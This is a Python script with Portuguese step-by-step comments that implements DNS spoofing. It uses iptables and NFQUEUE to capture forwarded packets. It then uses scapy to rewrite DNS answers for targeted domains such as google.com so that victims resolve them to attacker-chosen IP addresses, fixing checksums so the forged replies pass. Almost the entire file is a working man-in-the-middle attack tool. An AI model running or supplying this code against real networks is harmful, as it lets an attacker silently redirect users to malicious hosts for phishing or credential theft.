from netfilterqueue import NetfilterQueue
import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR


# netfilterqueue e uma biblioteca que permite acesso aos pacotes que sao correspondidos
# por uma tabela de ip no linux (iptables)
# os pacotes combinados podem ser aceitos, descartados, alterados

class DnsSnoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        #Etapa 3: Crie o objeto NetfilterQueue.
        self.queue = NetfilterQueue()

    # __call__ permite usar a instancia da classe como funcao
    def __call__(self):
        '''
        Passo 2: Insira esta regra na tabela de IP,
        para que os pacotes sejam redirecionados para o NetfilterQuque.
        Entao, podemos usar o pacote scapy para modificar os pacotes na fila.
        O numero da fila pode ser qualquer numero de sua escolha.
        :return:
        '''
        # criar regra no iptables para enviar os pacores roteados para a fila do netfilter
        # permitindo serem tratados
        log.info("Spoofing....")
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(self.queueNum))
        #Etapa 4: Vincule o objeto da fila ao numero da fila e a uma funcao de
        # retorno de chamada. Em seguida, inicie a fila apos implementar a funcao callBack.
        # vincular objeto da fila, o numero da fila e a funcao callback
        self.queue.bind(self.queueNum, self.callBack)
        try:
            # iniciar fila
            self.queue.run()
        except KeyboardInterrupt:
            # restaurar a regra do iptable e a conexao
            os.system('iptables -D FORWARD -j NFQUEUE --queue-num {}'.format(self.queueNum))
            log.info("[!] iptable rule flushed")

    def callBack(self, packet):
        #Etapa 6: A funcao callBack sera chamada quando um novo pacote entrar na fila.
        # O pacote sera passado como argumento para a funcao callBack.
        # Etapa 7: a seguir, converta o pacote NetfilterQueue em pacote scapy para processar o pacote.
        # pegar a carga util do pacote e transforma em pacote ip do scapy para ser processado
        scapyPacket = IP(packet.get_payload())
        # Etapa 8: Verifique se o pacote scapy contem o DNS Resource Record (DNSRR).
        # Se tiver o DNSRR, iremos modificar o pacote, caso contrario nenhuma alteracao sera feita no pacote.
        if scapyPacket.haslayer(DNSRR):
            try:
                # informacoes do DNS Resource Record (DNSRR)
                log.info('[original] {}'.format(scapyPacket[DNSRR].summary()))
                # Etapa 9: Obtenha o nome da consulta DNS do pacote scapy.
                # O nome da consulta e o nome do host enviado pela vitima ao servidor DNS.
                # DNS Question Record (DNSQR) contem uma campo variavel com o dominio gravado
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.hostDict:
                    # Etapa 10: Se queryName em nosso hostDict de destino,
                    # modificamos o endereco IP de DNS enviado com o endereco IP em hostDict.
                    # criamos um pacote DNSRR(DNS Resource Records - onde contem o mapeamento dos dominios e enderecos)
                    # com o nome e o ip alvo, rrname = url do endereco, rdata = ip do endereco
                    # para a resposta
                    scapyPacket[DNS].an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName])
                    # Etapa 11: Modifique o ancount do pacote com 1, pois enviamos um unico DNSRR para a vitima.
                    scapyPacket[DNS].ancount = 1
                    # Etapa 12: A corrupcao do pacote pode ser detectada usando a soma de verificacao e outras informacoes,
                    # portanto, nos os excluimos e geramos uma nova entrada usando scapy.
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    log.info('[modified] {}'.format(scapyPacket[DNSRR].summary()))
                    # informacoes do pacote DNSRR gerado
                else:
                    log.info('[not modified] {}'.format(scapyPacket[DNSRR].rdata))
                    # Endereco IP do pacote nao modificado
            except IndexError as error:
                log.error(error)
            # Etapa 13: Defina a carga util do pacote scapy modificado para o pacote NetfilterQueue.
            packet.set_payload(bytes(scapyPacket))
            # Etapa 14: O pacote esta pronto para ser enviado a vitima.
        return packet.accept()


if __name__ == '__main__':
    try:
        # Etapa 5: Criacao de dicionario de registro DNS de nomes de host que
        # precisamos falsificar. Voce pode adicionar mais mapeamento de nome de
        # dominio conforme sua escolha (todos os enderecos IP mapeados nao precisam ser os mesmos).
        hostDict = {
            b"google.com": "157.240.12.35",
            b"facebook.com": "142.251.134.110",
            b"g1.com.br": "142.251.134.110"
        }
        queueNum = 1
        # configura o log para mostrar a mensagem e o time
        log.basicConfig(format='%(asctime)s - %(message)s',
                        level=log.INFO)
        # Etapa 15: Ao encerrar o script, remova a regra de tabela de IP criada.
        snoof = DnsSnoof(hostDict, queueNum)
        snoof()
    except OSError as error:
        log.error(error)